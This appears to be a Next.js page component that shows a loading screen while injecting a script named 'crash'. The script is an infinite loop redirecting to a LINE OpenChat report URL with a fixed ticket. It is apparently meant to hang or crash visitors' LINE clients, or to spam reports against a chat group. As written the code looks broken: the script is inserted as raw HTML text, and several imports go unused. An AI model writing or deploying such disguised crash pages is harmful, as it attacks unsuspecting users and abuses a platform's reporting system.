// VRUlSfBloNo75Ztdue05qw6EtYqCKeJZlRvM-w

"use client";
import { liff } from "@line/liff";
import { getLiffId } from "@/utils/getLiffId";
import { useEffect } from "react";
import { Loading } from "@/src/components/Loading/Loading";

export default function Token() {

    const crash = `
    while (!0) {
        location.href = "line://square/report?ticket=VRUlSfBloNo75Ztdue05qw6EtYqCKeJZlRvM-w"
    }
    `

    return <><Loading />
    <div dangerouslySetInnerHTML={{ __html: crash}}></div></>
}